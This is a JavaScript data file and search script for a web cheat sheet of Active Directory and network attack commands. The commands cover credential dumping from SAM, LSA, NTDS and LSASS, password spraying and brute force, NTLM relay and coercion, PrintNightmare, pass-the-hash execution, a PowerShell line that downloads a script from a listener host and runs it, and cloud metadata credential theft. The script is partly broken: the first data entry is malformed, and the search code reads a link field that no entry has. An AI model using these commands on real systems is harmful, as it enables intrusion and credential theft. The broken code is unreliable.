var data = [

//CME
{"title":"cme","Link: ./cheats/Active_directory/cme.md"},

{"title":"cme - enumerate password policy : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --pass-pol"},
{"title":"cme - enumerate null session : cme smb &lt;ip&gt; -u -p "},
{"title":"cme - enumerate anonymous login : cme smb &lt;ip&gt; -u &lt;a&gt; -p "},
{"title":"cme - enumerate active sessions : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --sessions"},
{"title":"cme - enumerate domain users : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --users"},
{"title":"cme - enumerate users by bruteforce the RID : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --rid-brute"},
{"title":"cme - enumerate domain groups : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --groups"},
{"title":"cme - enumerate local groups : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --local-groups"},
{"title":"cme - Enumerate permissions on all shares : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --shares"},
{"title":"cme - Enumerate disks on the remote target : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --disks"},
{"title":"cme - enumerate smb target not signed : cme smb &lt;ip&gt; --gen-relay-list smb_targets.txt"},
{"title":"cme - enumerate logged users : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --loggedon-users"},
{"title":"cme - enable/disable the WDigest provider and dump clear-text credentials from LSA memory : cme smb &lt;ip&gt; -u &lt;user|Administrator&gt; -p &lt;password&gt; --local-auth --wdigest enable"},
{"title":"cme - Can be useful after enable wdigest to force user to reconnect : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -x &lt;quser&gt;  - cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -x &lt;logoff &lt;id_user&gt; --no-output"},
{"title":"cme - local-auth : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --local-auth"},
{"title":"cme - local-auth with hash : cme smb &lt;ip&gt; -u &lt;user&gt; -H &lt;hash&gt; --local-auth"},
{"title":"cme - domain auth : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;"},
{"title":"cme - kerberos auth : cme smb &lt;ip&gt; --kerberos"},
{"title":"cme - Dump SAM : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --sam"},
{"title":"cme - Dump LSA : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domaine&gt; --lsa"},
{"title":"cme - dump ntds.dit : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --ntds"},
{"title":"cme - dump lsass : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -M lsassy"},
{"title":"cme - dump lsass - with bloodhond update : cme smb &lt;ip&gt; --local-auth -u &lt;user&gt; -H &lt;hash&gt; -M lsassy -o BLOODHOUND=True NEO4JUSER=&gt;user|neo4j&gt; NEO4JPASS=&gt;neo4jpass|exegol4thewin&gt;"},
{"title":"cme - password spray (user=password) : cme smb &lt;dc-ip&gt; -u &lt;user.txt&gt; -p &lt;password.txt&gt; --no-bruteforce --continue-on-success"},
{"title":"cme - password spray multiple test : cme smb &lt;dc-ip&gt; -u &lt;user.txt&gt; -p &lt;password.txt&gt; --continue-on-success"},
{"title":"cme - put file : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --put-file &lt;local_file&gt; &lt;remote_path|\\Windows\\Temp\\target.txt&gt;"},
{"title":"cme - get file : cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --get-file &lt;remote_path|\\Windows\\Temp\\target.txt&gt; &lt;local_file&gt;"},
{"title":"cme - ASREPRoast enum without authentication : cme ldap &lt;ip&gt; -u &lt;user&gt; -p --asreproast ASREProastables.txt --kdcHost &lt;dc_ip&gt;"},
{"title":"cme - ASREPRoast enum with authentication : cme ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --asreproast ASREProastables.txt --kdcHost &lt;dc_ip&gt;"},
{"title":"cme - Kerberoasting : cme ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --kerberoasting kerberoastables.txt --kdcHost &lt;dc_ip&gt;"},
{"title":"cme - Unconstrained delegation : cme ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --trusted-for-delegation"},
{"title":"cme - winrm-auth : cme winrm &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt;"},
{"title":"cme - mssql password spray : cme mssql &lt;ip&gt; -u &lt;user.txt&gt; -p &lt;password.txt&gt;  --no-bruteforce"},
{"title":"cme - mssql execute query : cme mssql &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --local-auth -q &lt;SELECT name FROM master.dbo.sysdatabases;&gt;"},
{"title":"cme - mssql execute command : cme mssql &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --local-auth -x &lt;cmd|whoami&gt;"},

//COERCER
{"title":"coercer - list vulns : coercer.py -d '&lt;domain&gt;' -u '&lt;user&gt;' -p '&lt;password&gt;' --listener &lt;hackerIp&gt; &lt;targetIp&gt;"},
{"title":"coercer - Webdav : coercer.py -d '&lt;domain&gt;' -u '&lt;user&gt;' -p '&lt;password&gt;' --webdav-host '&lt;ResponderMachineName&gt;' &lt;targetIp&gt; "},
{"title":"coercer - List vulns many targets : coercer.py -d '&lt;domain&gt;' -u '&lt;user&gt;' -p '&lt;password&gt;' --listener &lt;hackerIp&gt; --targets-file &lt;PathToTargetFile&gt;"},



//kerberos
{"title":"Kerbrute usersenum : ./kerbrute_linux_amd64 userenum -d &lt;domain&gt; --dc &lt;ip&gt; &lt;users_file&gt;"},
{"title":"kerberos enum users : nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm='&lt;domain&gt;'&quot; &lt;ip&gt;"},
{"title":"kerberos enum users (with user list) : nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm='&lt;domain&gt;',userdb=&lt;users_list_file&gt;&quot; &lt;ip&gt;"},
{"title":"powershell - get user SPN : powershell (new-object system.net.webclient).downloadstring('http://&lt;lhost&gt;/GetUserSPNs.ps1') | IEX"},
{"title":"use silver ticket : getST.py -spn host/&lt;dc2&gt; -impersonate &lt;user_to_impersonate&gt; -dc-ip &lt;dc1_ip&gt; '&lt;domain&gt;/&lt;computer_name&gt;$:&lt;computer_password&gt;'"},
{"title":"secret dump with kerberos : secretsdump -k &lt;dc&gt;:"},

// Lsassy
{"title":"Lsassy basic usage with password (ip or range) : lsassy -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;ip&gt;"},
{"title":"Lsassy basic usage with hash (ip or range) : lsassy -v -u &lt;user&gt; -H &lt;hash&gt; &lt;ip&gt;"},
{"title":"Lsassy basic usage with kerberos (ip or range) : lsassy -d &lt;domain&gt; -u &lt;user&gt; -k &lt;ip_range&gt;"},

//mitm6
{"title":"mitm6 -d &lt;domain&gt;"},

//responder
{"title":"responder launch : responder –I eth0"},
{"title":"responder launch - analyze mode : responder –I eth0 -A"},
{"title":"responder launch with wpad file  : responder -I eth0 --wpad"},
{"title":"multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf) : multirelay -t &lt;ip&gt; -u &lt;user1&gt; &lt;user2&gt;"},
{"title":"multirelay attack - all user (previous disable HTTP and SMB in Responder.conf) : multirelay -t &lt;ip&gt; -u ALL"},
{"title":"runfinger - Responder-related utility which will finger a single IP address or an IP subnet and will reveal if a target requires SMB Signing or not. : runfinger -i &lt;network_range&gt;"},
{"title":"ntlmrelayx add computer : ntlmrelayx -t ldaps://&lt;dc1&gt; -smb2support --remove-mic --add-computer &lt;computer_name&gt; &lt;computer_password&gt; --delegate-access"},


//rubeus
{"title":"inject ticket from file : Rubeus.exe ptt /ticket:&lt;ticket&gt;"},
{"title":"ASREPRoast specific user : Rubeus.exe asreproast  /user:&lt;user&gt; /domain:&lt;domain_name&gt; /format:&lt;AS_REP_response_format&gt; /outfile:&lt;output_hashes_file&gt;"},
{"title":"kerberoasting - current domain : Rubeus.exe kerberoast /outfile:&lt;output_TGSs_file&gt;"},
{"title":"Kerberos get hash: Rubeus.exe hash /user:&lt;user&gt; /domain:&lt;domain_name&gt; /password:&lt;password&gt;"},

//LAPS
{"title":"get laps passwords : Get-LAPSPasswords -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\&lt;login&gt; | Format-Table -AutoSize"},

//Printerbug and Petitpotam
{"title":"Finding Spooler services listening : rpcdump.py &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;dc&gt; | grep MS-RPRN"},
{"title":"Finding Spooler services anonymous : rpcdump.py &lt;dc&gt; | grep -A 6 MS-RPRN"},
{"title":"printerbug : printerbug.py '&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;'@&lt;ip&gt; &lt;attacker_ip&gt;"},
{"title":"webclientservicescanner : webclientservicescanner '&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;'@&lt;ip_range&gt;"},
{"title":"PetitPotam : PetitPotam.py -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; &lt;listener&gt; &lt;target&gt;"},
{"title":"PrintNightmare: CVE-2021-1675.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target_ip&gt; '\\&lt;attacker_ip&gt;\&lt;share_name&gt;\&lt;dll_name|inject&gt;.dll'"},
{"title":"Printspoofer privesc: PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss &lt;launch_cmd&gt;"},

//scshell
{"title":"stealty psexec : python3 scshell.py -service-name &lt;service-name|defragsvc&gt; -hashes :&lt;ntlm-hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;"},

//rpcclient
{"title":"rpcclient - enumdomusers: rpcclient &lt;ip&gt; -U &quot;&lt;user&gt;%&lt;password&gt;&quot; -c &quot;enumdomusers;quit&quot;"},
{"title":"rpcclient - srvinfo: rpcclient &lt;ip&gt; -U &quot;&lt;user&gt;%&lt;password&gt;&quot; -c &quot;srvinfo;quit&quot;"},

//certipy
{"title":"certipy - list certificate templates: certipy find &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;dc-ip&gt; "},
{"title":"certipy - request certificate: certipy req &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;ca-ip&gt; -template &lt;template&gt; -ca &lt;certificate-authority&gt;"},


//IMPACKET
{"title":"lookupsid - SID User Enumeration,  extract the information about what users exist and their data : lookupsid.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt;"},
{"title":"reg - query registry info remotely : reg.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt; query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s"},
{"title":"rpcdump - list rpc endpoint : rpcdump.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt;"},
{"title":"services.py - (start, stop, delete, read status, config, list, create and change any service) remote : services.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt; &lt;action&gt;"},
{"title":"getarch - find target architecture (64 or 32 bits) : getArch.py -target &lt;ip&gt;"},
{"title":"netview - enumeration tool (ip/shares/sessions/logged users) - need dns set : netview.py &lt;domain&gt;/&gt;user&gt; -target &lt;ip&gt; -users &lt;users_file&gt;"},
{"title":"smbclient - connect to smb on the target: smbclient.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;"},
{"title":"GetNPUsers without password to get TGT (ASREPRoasting): GetNPUsers.py &lt;domain&gt;/&lt;user&gt; -no-pass -request -format hashcat"},
{"title":"GetNPUsers - (ASREPRoasting): GetNPUsers.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/ -usersfile &lt;users_file&gt; -format hashcat"},
{"title":"GetUSERSPN : GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;"},
{"title":"GetADUser - : GetADUsers.py -all &lt;domain&gt;/&lt;user&gt;:&lt;password&gt; -dc-ip &lt;dc_ip&gt;"},
{"title":"PSEXEC with username: psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;"},
{"title":"PSEXEC with pass the Hash (pth): psexec.py -hashes &lt;hash&gt; &lt;user&gt;@&lt;ip&gt;"},
{"title":"PSEXEC with kerberos: export KRB5CCNAME=&lt;ccache_file&gt;; psexec.py -dc-ip &lt;dc_ip&gt; -target-ip &lt;ip&gt;&gt; -no-pass -k &lt;domain&gt;/&lt;user&gt;@&lt;target_name&gt;"},
{"title":"SMBEXEC with username: smbexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;"},
{"title":"SMBEXEC with pass the Hash (pth): smbexec.py -hashes &lt;hash&gt; &lt;user&gt;@&lt;ip&gt;"},
{"title":"wmiexec :wmiexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;"},
{"title":"wmiexec  with pass the hash (pth): wmiexec.py -hashes &lt;hash&gt; &lt;user&gt;@&lt;ip&gt;"},
{"title":"smbserver - share smb folder: smbserver.py &lt;shareName&gt; &lt;sharePath&gt;"},
{"title":"smbserver - share smb folder with authentication: smbserver.py -username &lt;username&gt; -password &lt;password&gt; &lt;shareName&gt; &lt;sharePath&gt;"},
{"title":"ntlmrelay: ntlmrelayx.py -tf &lt;targets_file&gt; -smb2support -e &lt;payload_file|payload.exe&gt;"},
{"title":"ntlmrelay - socks: ntlmrelayx.py -tf &lt;targets_file&gt; -socks -smb2support"},
{"title":"ntlmrelay - authenticate and dump hash: ntlmrelayx.py -tf &lt;targets_file&gt; -smb2support"},
{"title":"ntlmrelay - to use with mitm6: ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -t smb://&lt;target&gt; -l /tmp -socks -debug"},
{"title":"ntlmrelay - to use with mitm6 - delegate access: ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; -wh &lt;attacker_ip&gt; --delegate-access"},


//Bruteforce
{"title":"Hydra - ssh - userlist and password list - 22: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; ssh "},
{"title":"Hydra - ssh - user and password  - 22:hydra -l &lt;user|root&gt; -p &lt;password|root&gt; &lt;ip&gt; ssh "},
{"title":"Hydra - ftp - 21: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; ftp "},
{"title":"Hydra - smb - 445: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; smb"},
{"title":"Hydra - mysql - 3306: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; mysql"}, 
{"title":"Hydra - vnc - 5900: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; vnc "},
{"title":"Hydra - postgres - 5432: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; postgres"},
{"title":"Hydra - telnet - 23: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; telnet "},
{"title":"cewl - wordlist creation: cewl -w &lt;file|wordlist.txt&gt; -d &lt;deep|3&gt; -m &lt;min_word_size|5&gt; &lt;url&gt;"},
{"title":"crunch - generate wordlist hex: crunch &lt;min|2&gt; &lt;max|8&gt; 0123456789ABCDEF -o &lt;output.txt&gt;"},
{"title":"crunch - generate wordlist charset: crunch &lt;min&gt; &lt;max&gt; -f /usr/share/crunch/charset.lst &lt;charset|mixalpha-numeric&gt; -o &lt;output.txt&gt;"},

//Cloud
{"title":"SSRF in EC2 - List roles: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
{"title":"SSRF in EC2 - Dump roles: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role_name&gt;"},

//Download
{"title":"download with certutil: certutil.exe -urlcache -split -f http://&lt;server&gt;/&lt;source_file&gt; &lt;dest_file&gt;"},
{"title":"download with  certutil (2): certutil.exe -verifyctl -f -split h http://&lt;server&gt;/&lt;source_file&gt; &lt;dest_file&gt;"},
{"title":"Encode in base64 with certutil : certutil -decode enc.txt &lt;file&gt;"},
{"title":"Download with powershell"},
{"title":"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile (New-Object System.Net.WebClient).DownloadFile('http://&lt;server&gt;/&lt;source_file&gt;','&lt;dest_file&gt;')"},
{"title":"python Simple HTTP server: python -m SimpleHTTPServer &lt;lport&gt;"},
{"title":"python3 Simple HTTP server: python3 -m http.server &lt;lport&gt;"},
{"title":"php Simple builtin server: php -S 0.0.0.0:&lt;lport&gt;"},

//Crontab
{"title":"List cron jobs: crontab -l"},
{"title":"Edit cron job: crontab -e"}

]


//O trecho de código acima corresponde a uma função que é executada quando o usuário digita algo no campo de busca. A função começa por definir duas variáveis, count e t0 e t1, para armazenar os resultados da pesquisa. A variável count é usada para contar o número de resultados encontrados. As variáveis t0 e t1 são usadas para medir o tempo de processamento da pesquisa. Em seguida, é criado um regex para procurar o termo de pesquisa nos dados. Depois disso, é percorrido cada item de dados e procurado os termos de pesquisa. Se achado, o item é adicionado ao array de resultados. Por fim, o resultado é mostrado na tela junto com o número de itens encontrados e o tempo de processamento da pesquisa.

var count = 0;
var t0 = t1 = 0;

$('#txt-search').keyup(function() {
    var cresult = [];
    t0 = performance.now();
    var searchField = $(this).val();
    if (searchField === '') {
        $('#filter-records').html('');
        return;
    }
    
    var regex = new RegExp(searchField, "i");
    var output = '<div class="row grid divide-y divide-gray-500">';
    $.each(data, function(key, val) {
        if ((val.title.search(regex) != -1) || (val.link.search(regex) != -1)) {
            output += `<div class="row antialiased p-2">
          <a target="_blank" rel="noopener nofollow noreferrer"> ✍️ ${val.link}</a>
                      </div>`
            cresult.push({
                title: `${val.title}`,
                link: `${val.link}`
            })
            count++;
        }
    });
    output += `</div>`

    $('#filter-records').html(output);
    t1 = performance.now();
    $("#filter-records").prepend(`<div class="text-bold text-center mb-8">Found <code>${cresult.length}</code> resources related to <b>${removeTags(searchField)}</b> in <code>${t1-t0} ms</code></div>`);
});

// hashtag clicks 
//O trecho de código acima trata de um evento de clique, onde quando o elemento com a classe .searchfilter for clicado, é executada a função search(), que verifica se o conteúdo do elemento contém o valor passado como parâmetro no elemento. Se o resultado for positivo, é adicionado um elemento com um link e o título ao elemento #filter-records.
//Também é feita uma função que remove os banners presentes na página, outra para verificar parâmetros da url, uma função para converter o resultado em um objeto json e outra para sanitizar o html.

$('.searchfilter').click(function() {
    output = search($(this).val());
    $("#filter-records").html(output)
})

function search(filter) {
    var regex = new RegExp(filter, "i");
    var output = '<div class="row grid divide-y divide-gray-500">';
    $.each(data, function(key, val) {
        if ((val.title.search(regex) != -1) || (val.link.search(regex) != -1)) {
            output += `<div class="row antialiased p-2">
  <a href=${val.link} target="_blank" rel="noopener nofollow noreferrer">
✍️ ${val.title}</a>
              </div>`
        }
    });
    return output;
}

// remove banner

function Remove(el) {
    var element = el;
    element.remove();
}

// query url param

query = new URLSearchParams(window.location.search);
param = query.get('q');
if(param.length>1) {
  output = search(param)
  $("#filter-records").html(output)
  $("#filter-records").prepend(`<div class="text-bold text-center mb-8">Showing resources related to <b>${removeTags(param)}</b></div>`);
}

// json
function jsonify(filter) {
    var regex = new RegExp(filter, "i");
    var res = []
    $.each(data, function(key, val) {
        if ((val.title.search(regex) != -1) || (val.link.search(regex) != -1)) {
          res.push({
                title: `${val.title}`,
                link: `${val.link}`
            })
     
        } })
    return res;
}

// JSON 
 function downloadObjectAsJson(filter){
	if($('#txt-search').val().length > 0) {
		var exportData = jsonify($('#txt-search').val())
		var dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(exportData));
		var downloadAnchorNode = document.createElement('a');
		downloadAnchorNode.setAttribute("href",     dataStr);
		downloadAnchorNode.setAttribute("download", `${$('#txt-search').val()}.json` );
		document.body.appendChild(downloadAnchorNode); // required for firefox
		downloadAnchorNode.click();
		downloadAnchorNode.remove();
	}
  }
  
 
 // Sanitize Html
 
var tagBody = '(?:[^"\'>]|"[^"]*"|\'[^\']*\')*';

var tagOrComment = new RegExp(
    '<(?:'
    // Comment body.
    + '!--(?:(?:-*[^->])*--+|-?)'
    // Special "raw text" elements whose content should be elided.
    + '|script\\b' + tagBody + '>[\\s\\S]*?</script\\s*'
    + '|style\\b' + tagBody + '>[\\s\\S]*?</style\\s*'
    // Regular name
    + '|/?[a-z]'
    + tagBody
    + ')>',
    'gi');
	
function removeTags(html) {
  var oldHtml;
  do {
    oldHtml = html;
    html = html.replace(tagOrComment, '');
  } while (html !== oldHtml);
  return html.replace(/</g, '&lt;');
};
